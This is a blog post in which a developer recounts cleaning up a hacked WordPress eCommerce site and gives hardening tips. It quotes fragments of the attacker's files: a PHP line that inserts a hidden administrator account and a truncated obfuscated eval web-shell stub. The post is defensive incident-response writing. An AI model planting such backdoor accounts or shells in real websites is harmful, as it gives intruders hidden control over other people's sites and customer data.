          <div class="post-styles"><p>The other day I had the great misfortune of dealing with the doings of a hacker on my clients site. Now normally I am very good about plugging any backdoors or weak spots before they can ever be exploited, but this particular client had brought me on after the site had been life a few weeks. The website had been setup by a designer which meant the likelihood of things being secure would not be great.</p>
<p>A fairly good assumption about an individual capable of destroying websites can be made regarding their personality: <strong>narcissistic</strong>. These individuals are not thinking about anyone else but themselves. I dont care what other factors are involved... because ultimately they are destroying smaller businesses and shutting down companies that cannot remain reputable on Google, unable to recover from the damage.</p>
<p>I accidentally came across something interesting in a google search the other day. It was a few recently hacked sites that appeared to be tagged by the inflictor with their nickname and any groups they associate with. Heres a screenshot of what it looks like:</p>
<p><img style="margin-left: auto;margin-right: auto" title="google-listing-hacked.png" src="https://wiregrunt.com/wp-content/uploads/2015/11/google-listing-hacked.png" alt="A Sample Listing of a website hacked into" width="390" height="66" border="0" /></p>
<p>I have heard of many circumstances where a smaller business was primarily running based off of the revenue it could create through eCommerce sales. Immediately after a malware exploit, these companies will endure a common set of consequences: google flags the site with a warning (<em>red screen of death</em>) which will deter many visitors by warning of possible exploits, page rank goes down the drain (<em>assuming this is not cleared up immediately</em>), and an annoyingly long game of back-and-forth between the developer and google as to whether the site has been sufficiently cleaned (<em>in most situations</em>). For a small business, this is likely to shut it down, if not by taking away any edge that company has over its competitors then by deterring users from ever coming back.</p>
<p>Hackers shutdown businesses which lead to people losing their jobs in some cases. I wonder if any thought is ever given by malicious coders as to how they are affecting people down the pipe line I doubt it. Or at least not nearly as much consideration as they should or they wouldnt be doing what they do.</p>
<h2>Background</h2>
<p>I recently got brought on as a junior web developer at a mid-sized eCommerce company. My main duties were nothing to difficult, more or less to do with writing code for performance gains, figuring out what could be done to improved overall SEO for Google page-rank in terms of a backend file-structure point of view, and implementing whatever small additions/features the big guys upstairs felt were necessary. Just to polish off this brief background, the new site has been live for maybe a month now, was built on wordpress, and uses a popular eCommerce theme.</p>
<h2>Something Isnt Right</h2>
<p>I got a text early in the morning from the marketing manager which lead to a brief conversation with head of marketing which went along the lines of:</p>
<blockquote>
Marketing:  <span>Jane (<em>customer support rep</em>) said the malicious malware sign is showing up.</span>
Marketing:  <span>Oh, and if you look at Wordfence, it is saying there are a lot of changes to our PHP files.</span>
Me:  <span>Hmm, interesting. Wordfence can often generate false-positives related to plugin updates.</span>
Me:  <span>...but I am curious to check things out.</span>
Marketing:  <span>Oh No our website is strait up redirecting people to a bad website.</span>
</blockquote>
<p>Sure enough, when I walked through the door and immediately logged on, the site was indeed causing google to flag it. A bright red screen of death describing how the following site poses a security threat popped up.</p>
[caption id="attachment_117" align="aligncenter" width="680"]<a href="https://wiregrunt.com/wp-content/uploads/2015/11/google-warning.jpg"><img src="https://wiregrunt.com/wp-content/uploads/2015/11/google-warning.jpg" alt="Google Malware Warning - Sample" width="680" height="400" class="size-full wp-image-117" /></a> Google Malware Warning - Sample[/caption]
<p>Now for those of you familiar with working for smaller companies that are primarily eCommerce-driven, this is something that absolutely CANNOT happen. The most basic reason being that the number of returning customers is a fragile one, and they are responsible for how the company has gotten where it is in the first place. To lose the trust of these individuals means losing a type of support which represents a pillar that your company can stand on.</p>
<h2>The Game Plan</h2>
<p>For anyone reading, I cannot stress enough the importance of establishing a <strong>plan of action</strong> for potential security breaches. Knowing exactly what to do in situations like these will keep your superiors calm(er) and more importantly make your life a lot less stressful. Please, please, PLEASE do yourselves a favor and map out a gameplan.</p>
<p>Ours was fairly simple. Shortly after entering the backend of the site, I started looking for any files that had recently been modified (<em>primarily around the previous evening when the problem has supposedly first been noticed</em>). I should note at this point in time that you should keep copies of any malicious files you may find. I usually make a new folder titled quarantine where Ill put any potentially harmful stuff for future reference. The reason behind this is because someone who has experience dealing with security breaches will use those files to figure out exactly what was done to your website. By having a copy of the unwanted code, a developer can work their way back through it (<em>line by line</em>) and hopefully reverse any harmful actions that were performed (<em>assuming that the damage was not so much so that this would be to tedious a task to complete</em>). Furthermore, this harmful code will help in establishing where the weak spots in your sites security may have been so that you can ensure they are strengthened. I also would encourage submitting these files to companies that develop plugins and applications such that they can use the files for future reference when scanning websites.</p>
<p>If you are using Wordpress, I recommend installing a plugin like <a href="https://www.wordfence.com/">Wordfence</a>that will watch all your sites files. Programs like this are able to alert you through email and text when a file is added or changed. This is really the only reason I encourage such installations, because by getting realtime alerts you are more likely to catch the harmful scripts before they can do any real damage to your database. It costs a couple extra bucks to go premium, but this is well worth your money and time. Having a plugin that not only watches your theme files but also your core files will benefit you in the long run. Trust me when I say that the amount of time spent trying to clean up a dirty database versus paying $15 is incomparable. I dont care how much time is tacked on to your page load speed, this is something you should be investing in if you are responsible for a websites well being.</p>
<h2>Step 1: Damage Control</h2>
<p>The first thing you should do is a preventative measure. Yes you have been hacked but it will only get worse and cause more problems if you dont act quickly and remove whatever has been injected already. Immediately upon initial examination of my clients remote files I was able to find two such items. The first was a php file titled<strong> k.php</strong>. A second file (<em>in the same location</em>) I found was titled <strong>bfc.php</strong>. If you have a lot of experience working with code, it doesnt take long to recognize a few key lines from the scripts in these two files. My eyes were quickly drawn to this:</p>
<pre><code><span style="font-family: Helvetica;font-size: 12px">$query = "INSERT INTO `".$table_pref."users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`, `display_name`) VALUES ('9192191', 'wpupdatelist', '".base64_decode("JFAkQk5yZm")."', 'tempuser', 'support@wpsecurity.com', '0', 'Temp User')";</span></pre></code>
<p>Here we have a new user account being created and inserted into the MySQL database. Notice the choice of name and email being used here: <strong>wpupdatelist</strong>, <strong>tempuser</strong>, and <strong>support@wpwhitesecurity.com</strong>. Its important to be mindful that if the hacker has any brains (<em>albeit they are dumb enough TO WANT to hack a site in the first place</em>) they will use login names and emails which wont stand out upon an initial inspection. It only took a few seconds to locate the new user account and remove it via MySQL.</p>
<p>Many will urge you to take the website down, at least until you are able to remove anything harmful. I agree with this but should note that it was not something I considered a viable option. As far as I was concerned, the files were found quickly, and within an hour I had cleaned up any backdoors and potential exploits. If you are not sure that these things are closed, then with all means bring the site offline until you can be certain.</p>
<h2>Step 2: Initial Security Maneuvers</h2>
<p>Immediately after removing the new user I implemented a new password policy and then proceeded to update all passwords for administrative accounts. I then went into the configuration file (<em>wp-config.php</em>) and switched out all authentication keys and salts. What this does is rather immediate: anyone seeking logged-in content on the website will have to provide a password beforehand. So the next time a logged-in user sends a request for anything on the site, they will be logged out and asked to provide their credentials to get back in. Go <a href="https://api.wordpress.org/secret-key/1.1/salt/">here</a> (<em>refresh the page to generate new ones</em>) in order to get new salts:</p>
<code><pre>
<span style="font-size: 12px;font-family: Helvetica">define('AUTH_KEY', '&amp;|wTaDllVPP&lt;}{I!+|)]/udF#DEsUpVXWzJkrDd,&lt;8V#]M{?B-~KYP)1&amp;S r!X)q');</span>
<span style="font-size: 12px;font-family: Helvetica">define('SECURE_AUTH_KEY', 'UB3m2&amp;W=d&amp;,u:6B,nNTZ_XZwck.}mJ[A0zXY@w?{( auQEzx=;Ew^MzTUSKhw}k&lt;');</span>
<span style="font-size: 12px;font-family: Helvetica">define('LOGGED_IN_KEY', 'TPxQ&amp;Dm]}L3YLlR+S|M&gt;sT?{K|) icJ.}ke,-+jEC_+-J9_QBDe+-IU4ZdBI:Wp+');</span>
<span style="font-size: 12px;font-family: Helvetica">define('NONCE_KEY', 'X&lt;K0*&lt;w+Xc-:0+p&gt;2SGA=-] ^~7HT&amp;KE0C9+k`&amp;j]J#Hi+Cs5.5fD/PF;B~-pJoh');</span>
<span style="font-size: 12px;font-family: Helvetica">define('AUTH_SALT', '@UF6Yh5eYek9pxQ*Gq8aa=, ]oC[ykonGuHu%!4:2tQpg]AZ^sqw+({PnW&lt;}--jN');</span>
<span style="font-size: 12px;font-family: Helvetica">define('SECURE_AUTH_SALT', '~(LwjpLJ8Tk|d~Nz+|A7LjbXZbky.^awH2v1c2p`Q{cJXBD7b;d;&gt;%fP?V$(vrA&amp;');</span>
<span style="font-size: 12px;font-family: Helvetica">define('LOGGED_IN_SALT', 'H&amp;72-ai?p%$&gt;^-qd0! F&amp;kEW#QG8G!)+aD6eJsNsmc^}+hd}UOUu{&amp;t|f.E/d[3)');</span>
<span style="font-size: 12px;font-family: Helvetica">define('NONCE_SALT', '!CTN++6is47p$[_g.11wA1h4)Sm F^.tW w4DQKlO1VI^g*Z+i:E1T)qEJ|{uJ|]');</span></pre></code>
<p>There was also a administrative account that Wordfence had shown to be the attention of many failed login attempts. In retrospect, this account was also listed as the author for the sites blogposts which was a pretty poor decision made by whomever was in charge before I came along. NEVER EVER make the usernames for any of your administrative accounts visible to the public. This only simplifies the process for any potential hackers looking to brute force into the sites backend controls (<em>think about it there only two things stand in the way of a hacker trying to gain access to your sites backend: an account name and corresponding password</em>).</p>
<p>I also made a point of getting all employees to use <a href="https://lastpass.com/">LastPass</a> for storing passwords. This will store all passwords using encryption as well as encouraging stronger passwords in the first place. There is really nothing to lose and much to gain from implementing a policy like this. No more worrying if it was an account with weak password strength that is responsible for unauthorized backdoor access.</p>
<h2>Step 3: Replacement &amp; Repair</h2>
<p>At this point you need to do a thorough scan of absolutely EVERYTHING. This includes all files on your remote server, your Wordpress core files, themes, child themes, plugins, widgets and database (<em>combing through the database is a task for more advanced developers, so please, PLEASE dont attempt to do this unless you have plenty of past experience</em>). In most cases, if you ask your hosting provider they often will perform a scan of your database for you. I also encourage replacing your core wordpress files with a fresh install (<em>better safe then sorry</em>).</p>
<p>I wish there was more to say about this step, but in truth all I can say (<em>short of writing ahow to guide</em>) is that this step takes some time. How much time will be up to you. If you choose to simply replace all your files and switch out your database with a backup, thats great and you probably will save a few days-worth of work. But chances are that things will not be exactly as they were before (<em>particularly if you are dealing with an eCommerce site where there arehundreds, maybe thousands of product variations and images being managed</em>). Therefore consideration must always be given to how things on the front end may be affected. </p>
<p>Fortunately for my situation, having removed the harmful scripts was done early enough that not much damage had been done. I dont say this lightly as it took nearly 3 days (<em>roughly 16 hrs / day</em>) looking for solutions, searching through files, and talking to the hosting provider. This was absolutely a nightmare that could have been prevented in the past if they had only ensured minimal <strong>administrative accounts with strong passwords</strong>, some form of <strong>security monitoring system</strong> like Wordfence, and always <strong>kept things up to date</strong>.</p>
<p>At this point I noticed there were some hidden files in uploads folder. They both were base64 encoded and certainly were part of my problems. The uploads folder should never have any text or php files in it, so if you find this type of material then chances are they are a part of the problem! Here is what one of these files looked like:</p>
<code>
<pre>&lt;?php<br />if(!isset($_REQUEST['sam'])){echo "notfoundeds";}<br />$c=eval(chr(47).chr(42).chr(116).chr(116).chr(42).chr(47)...</pre>
</code>
<h2>Finally My Solution!</h2>
<p>Eventually after trying most of what is discussed above, I went ahead and <strong>switched out the theme/child-theme files for fresh copies</strong>. Im not sure why I didnt think to do it earlier, but judging from the success of this maneuver I am assuming there was some harmful javascript in one of my theme files that I simply would not be able to find on my own time.</p>
<p>I first changed the fresh copies to have the suffix _clean and then placed them in the themes folder next to the potentially infected versions. I then went into my wordpress backend and made sure that these files were showing up under the appearances tab. I then activated the fresh copies and simultaneously moved the old ones to a quarantine" folder outside of the reach of any hackers. Then the last step involved removing the suffix on the fresh copies and activating the theme again (<em>as Wordpress will show a missing theme as activated because you changed the extension</em>). If all goes according to plan you will not notice any changes to the front end. And as an added bonus, the malware redirect no longer was appearing either!</p>
<h2>In Retrospect...</h2>
<p>Looking back on this whole incident, there are quite a few things I wish had been already known prior to it all...</p>
<p>If there is a .htaccess file on your server, consider adding the following code that will stop anyone from accessing your configuration file (<em>wp-config</em>). This should be placed above everything currently in the document:</p>
<code><pre>&lt;files wp-config.php&gt;
order allow,deny
deny from all
&lt;/files&gt;</pre></code>
<p>You also will notice that In the dashboard on the backend of a Wordpress site there is an editor option under the Appearance tab. There is absolutely no reason this should ever be used. This will be the first place someone who gains access goes to in order to inject unwanted scripts as this only makes their job that much easier. Do yourself a favor and remove this option by adding the following line of code to your wp-config file:</p>
<code><pre>define(&lsquo;DISALLOW_FILE_EDIT, true);</pre></code>
<p>In most cases your hosting provider will generate your database tables and give them a name other than something starting with the prefix <em>wp_</em>. If this is not the case I encourage the change be made as this is the default and where hackers look first during injection attempts.</p>
<h2>Additional Resources</h2>
<p>I finish my story by reminding any readers that this is but only the tip of the iceberg.
